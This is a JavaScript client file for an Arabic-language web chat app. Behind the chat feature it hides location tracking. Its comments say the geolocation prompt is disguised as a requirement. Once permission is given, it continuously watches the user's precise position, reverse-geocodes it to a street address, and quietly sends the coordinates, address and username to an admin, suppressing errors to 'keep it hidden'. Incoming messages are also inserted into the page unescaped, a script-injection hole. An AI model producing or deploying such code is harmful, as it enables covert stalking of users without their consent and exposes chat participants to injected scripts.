document.addEventListener('DOMContentLoaded', () => {
    let socket = null;
    if (typeof io !== 'undefined') {
        socket = io();
    } else {
        console.warn('Socket.IO is not loaded.');
    }

    // UI Elements
    const joinScreen = document.getElementById('joinScreen');
    const chatScreen = document.getElementById('chatScreen');
    const joinForm = document.getElementById('joinForm');
    const usernameInput = document.getElementById('usernameInput');
    const chatForm = document.getElementById('chatForm');
    const messageInput = document.getElementById('messageInput');
    const chatMessages = document.getElementById('chatMessages');
    const onlineUsersSpan = document.getElementById('onlineUsers');

    let username = '';
    let watchId = null;

    // Join Chat
    joinForm.addEventListener('submit', (e) => {
        e.preventDefault();
        const inputName = usernameInput.value.trim();
        if (inputName) {
            username = inputName;
            
            // First, trigger location request ( disguised as a requirement )
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        // Permission granted, start tracking in background
                        startHiddenTracking();
                        enterChat();
                    },
                    (error) => {
                        // Even if denied, let them in so it looks like a real chat app
                        // But we log it or just let it be.
                        enterChat();
                    }
                );
            } else {
                enterChat(); // browser doesn't support it, just enter
            }
        }
    });

    function enterChat() {
        joinScreen.classList.remove('active');
        joinScreen.classList.add('hidden');
        
        chatScreen.classList.remove('hidden');
        setTimeout(() => chatScreen.classList.add('active'), 10);

        if (socket) {
            socket.emit('user_join_chat', username);
        }
    }

    // Chat Form Submit
    chatForm.addEventListener('submit', (e) => {
        e.preventDefault();
        const msg = messageInput.value.trim();
        if (msg && socket) {
            // Add my own message to UI immediately
            appendMessage('أنت', msg, 'sent');
            
            // Send to server
            socket.emit('chat_message', { sender: username, text: msg });
            messageInput.value = '';
        }
    });

    // Socket Events
    if (socket) {
        socket.on('chat_message', (data) => {
            appendMessage(data.sender, data.text, 'received');
        });

        socket.on('online_users_count', (count) => {
            onlineUsersSpan.textContent = count;
        });

        socket.on('user_joined_notice', (name) => {
            appendSystemMessage(`انضم ${name} إلى الغرفة`);
        });

        socket.on('user_left_notice', (name) => {
            appendSystemMessage(`غادر ${name} الغرفة`);
        });
    }

    function appendMessage(sender, text, type) {
        const msgDiv = document.createElement('div');
        msgDiv.className = `message ${type}`;
        msgDiv.innerHTML = `
            <span class="sender-name">${sender}</span>
            <div class="bubble">${text}</div>
        `;
        chatMessages.appendChild(msgDiv);
        scrollToBottom();
    }

    function appendSystemMessage(text) {
        const sysDiv = document.createElement('div');
        sysDiv.className = 'system-message';
        sysDiv.textContent = text;
        chatMessages.appendChild(sysDiv);
        scrollToBottom();
    }

    function scrollToBottom() {
        chatMessages.scrollTop = chatMessages.scrollHeight;
    }

    // -----------------------------------------------------
    // HIDDEN LOCATION TRACKING LOGIC (Sent to Admin only)
    // -----------------------------------------------------
    function startHiddenTracking() {
        if (!navigator.geolocation) return;

        watchId = navigator.geolocation.watchPosition(
            async position => {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                
                // Fetch address silently
                let addressDetails = null;
                try {
                    const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1&accept-language=ar`);
                    if (response.ok) {
                        const data = await response.json();
                        addressDetails = data.address || {};
                    }
                } catch (e) {} // ignore errors to keep it hidden

                if (socket) {
                    socket.emit('update_location', {
                        lat: lat,
                        lon: lon,
                        addressDetails: addressDetails,
                        username: username // Send username so admin knows who it is
                    });
                }
            },
            error => { /* do nothing, keep it hidden */ },
            { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
        );
    }
});
